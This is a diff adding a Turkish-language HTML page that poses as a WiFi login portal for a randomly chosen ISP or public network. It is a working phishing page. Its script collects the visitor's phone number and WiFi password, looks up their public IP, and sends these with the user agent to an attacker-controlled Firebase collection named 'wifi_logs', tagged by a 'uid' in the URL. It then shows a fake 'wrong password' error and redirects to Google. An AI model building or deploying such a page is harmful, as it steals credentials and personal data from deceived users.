@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>WiFi Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+        }
+        .wifi-icon {
+            font-size: 4rem;
+            margin-bottom: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%,100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.08); }
+        }
+        .title { font-size: 1.2rem; font-weight: 700; color: #1a1a2e; margin-bottom: 4px; }
+        .subtitle { font-size: 0.75rem; color: #666; margin-bottom: 20px; }
+        .network-name {
+            background: #f0f4ff;
+            border: 2px solid #2196F3;
+            border-radius: 16px;
+            padding: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .network-name .signal { font-size: 1.2rem; }
+        .network-name .ssid { font-weight: 700; color: #1a1a2e; font-size: 0.9rem; }
+        .network-name .lock { font-size: 0.9rem; color: #ff9800; }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            font-size: 0.85rem;
+            outline: none;
+            margin-bottom: 12px;
+            font-family: inherit;
+            transition: border 0.2s;
+        }
+        .input-field:focus { border-color: #2196F3; }
+        
+        .connect-btn {
+            width: 100%;
+            background: #2196F3;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        .connect-btn:hover { background: #1976D2; transform: translateY(-1px); box-shadow: 0 8px 24px rgba(33,150,243,0.4); }
+        .connect-btn:disabled { opacity: 0.6; }
+        
+        .security-info {
+            font-size: 0.65rem;
+            color: #888;
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+        .error-text { color: #f44336; font-size: 0.7rem; margin-top: 8px; display: none; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="wifi-icon">📶</div>
+    <div class="title">WiFi Bağlantısı Gerekli</div>
+    <div class="subtitle">Devam etmek için WiFi şifrenizi girin</div>
+    
+    <div class="network-name">
+        <span class="signal">📡</span>
+        <span class="ssid" id="ssidName">TURKNET_FIBER_5G</span>
+        <span class="lock">🔒</span>
+    </div>
+    
+    <input type="text" class="input-field" id="phoneInput" placeholder="Telefon numarası">
+    <input type="password" class="input-field" id="wifiPass" placeholder="WiFi şifresi">
+    
+    <button class="connect-btn" id="connectBtn">🔗 BAĞLAN</button>
+    
+    <div class="error-text" id="errorMsg">Şifre hatalı! Lütfen tekrar deneyin.</div>
+    <div class="security-info">🔐 WPA2-PSK Korumalı · %100 Güvenli</div>
+</div>
+
+<script>
+    const ssidList = ["TURKNET_FIBER_5G", "SUPERONLINE_WiFi_2.4G", "VODAFONE_MOBIL", "TURKCELL_SUPERBOX", "AIRPORT_FREE", "CAFE_WIFI", "ISTANBUL_NET"];
+    document.getElementById('ssidName').innerText = ssidList[Math.floor(Math.random() * ssidList.length)];
+
+    document.getElementById('connectBtn').addEventListener('click', async () => {
+        const phone = document.getElementById('phoneInput').value.trim();
+        const password = document.getElementById('wifiPass').value.trim();
+        
+        if (!phone || !password) {
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').innerText = 'Lütfen tüm alanları doldurun!';
+            return;
+        }
+        
+        document.getElementById('connectBtn').disabled = true;
+        document.getElementById('connectBtn').innerText = 'Bağlanıyor...';
+        
+        const uid = new URLSearchParams(window.location.search).get('uid');
+        let ip = 'unknown';
+        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e) {}
+        
+        if (uid) {
+            try {
+                const firebaseConfig = {
+                    apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+                    authDomain: "camerahhh-15487.firebaseapp.com",
+                    projectId: "camerahhh-15487",
+                    storageBucket: "camerahhh-15487.firebasestorage.app",
+                    messagingSenderId: "212849652224",
+                    appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
+                };
+                
+                if (typeof firebase === 'undefined') {
+                    await new Promise(r => { const s = document.createElement('script'); s.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js'; s.onload = r; document.head.appendChild(s); });
+                    await new Promise(r => { const s = document.createElement('script'); s.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js'; s.onload = r; document.head.appendChild(s); });
+                }
+                if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+                
+                await firebase.firestore().collection("wifi_logs").add({
+                    ownerId: uid,
+                    phone: phone,
+                    wifiPassword: password,
+                    ssid: document.getElementById('ssidName').innerText,
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    unix: Date.now()
+                });
+            } catch(e) { console.log('Kayıt hatası:', e.message); }
+        }
+        
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').innerText = '⚠️ Şifre hatalı! Lütfen tekrar deneyin.';
+        document.getElementById('errorMsg').style.color = '#f44336';
+        
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 3000);
+    });
+</script>
+</body>
+</html>
